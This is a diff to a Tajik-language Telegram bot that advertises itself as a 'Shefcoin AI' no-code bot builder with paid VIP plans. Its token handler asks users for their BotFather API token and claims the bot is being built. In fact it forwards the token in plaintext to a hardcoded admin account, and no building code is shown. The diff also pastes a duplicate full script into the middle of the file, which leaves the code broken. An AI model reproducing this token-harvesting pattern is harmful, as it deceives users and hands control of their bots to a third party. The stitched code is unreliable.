@@ -462,5 +462,92 @@ def save_user_token(message):
         bot.send_message(message.chat.id, f"✅ **ТОКЕН ҚАБУЛ ШУД!**\n\nБоти шумо дар навбат аст. Мо онро дар сервери Render-и худ мепайвандем.\n\nID-и боти шумо: #user_{message.from_user.id}")
     else:
         bot.send_message(message.chat.id, "❌ **ХАТО!** Токен нодуруст аст. Дубора кӯшиш кунед.")
+import telebot
+import os
+from flask import Flask
+from threading import Thread
+
+# 👑 ТАНЗИМОТИ АСОСИИ SHEFCOIN AI
+# Токенро аз Render (Environment Variables) мегирад
+TOKEN = os.environ.get('BOT_TOKEN') 
+bot = telebot.TeleBot(TOKEN)
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "🌐 Shefcoin AI Constructor is Online!"
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+# 🛠 МЕНЮИ КОНСТРУКТОРИ SHEFCOIN
+def main_menu():
+    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        telebot.types.InlineKeyboardButton("🏗 Сохтани Боти Нав", callback_data="create_bot"),
+        telebot.types.InlineKeyboardButton("📋 Ботҳои Ман", callback_data="my_bots"),
+        telebot.types.InlineKeyboardButton("💰 Нархнома ва Обуна", callback_data="pricing"),
+        telebot.types.InlineKeyboardButton("👤 Профили Шеф", callback_data="profile"),
+        telebot.types.InlineKeyboardButton("📞 Дастгирии Техникӣ", callback_data="support")
+    )
+    return markup
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    welcome_text = (
+        f"💎 **Хуш омадед ба Shefcoin AI!**\n\n"
+        "Мо ба шумо кӯмак мекунем, ки боти шахсии худро дар 1 дақиқа созед. "
+        "Ҳеҷ гуна код лозим нест!"
+    )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu(), parse_mode="Markdown")
+
+# ⚙️ ЛОГИКАИ КОНСТРУКТОР
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    if call.data == "create_bot":
+        msg = bot.send_message(call.message.chat.id, 
+            "🔑 **ҚАДАМИ 1:**\n\nБа @BotFather равед, бот созед ва **API TOKEN**-ро нусхабардорӣ карда ба инҷо фиристед:")
+        bot.register_next_step_handler(msg, process_token)
+    
+    elif call.data == "pricing":
+        price_text = (
+            "💰 **НАРХНОМАИ SHEFCOIN AI:**\n\n"
+            "🔹 **Нақшаи Озод:** 1 бот (маҳдуд)\n"
+            "🔹 **Нақшаи VIP:** 50 TJS / моҳ (Ботҳои бемаҳдуд + VPN)\n\n"
+            "Барои фаъолсозӣ: @admin_shef"
+        )
+        bot.edit_message_text(price_text, call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode="Markdown")
+
+    elif call.data == "profile":
+        user_info = (
+            f"👤 **ПРОФИЛИ ШЕФ:**\n\n"
+            f"🆔 ID: `{call.from_user.id}`\n"
+            f"👤 Ном: {call.from_user.first_name}\n"
+            f"🏦 Баланс: 0.00 TJS"
+        )
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, user_info, parse_mode="Markdown")
+
+    elif call.data == "support":
+        bot.edit_message_text("📞 **МАРКАЗИ ДАСТГИРӢ:**\n\nАгар савол ё мушкилӣ доред, ба админ нависед: @admin_shef", 
+                              call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+
+def process_token(message):
+    token = message.text
+    if ":" in token and len(token) > 20:
+        bot.send_message(message.chat.id, "✅ **ТОКЕН ҚАБУЛ ШУД!**\n\nShefcoin AI ба сохтани боти шумо шурӯъ кард. Лутфан 5-10 дақиқа интизор шавед.")
+        
+        # ХАБАР БА АДМИН (БА ТУ)
+        # ID-и худро дар инҷо иваз кун агар лозим бошад
+        my_id = 6967256070 
+        bot.send_message(my_id, f"🚀 **ЗАКАЗИ НАВ БАРОИ БОТ:**\n👤 Аз: {message.from_user.first_name}\n🆔 ID: {message.from_user.id}\n🔑 Token: `{token}`")
+    else:
+        bot.send_message(message.chat.id, "❌ **ХАТО!** Токен нодуруст аст. Дубора кӯшиш кунед.")
+
+# 🚀 ОҒОЗИ СЕРВЕР
+if __name__ == "__main__":
+    t = Thread(target=run)
+    t.start()
+    bot.infinity_polling()
 
 
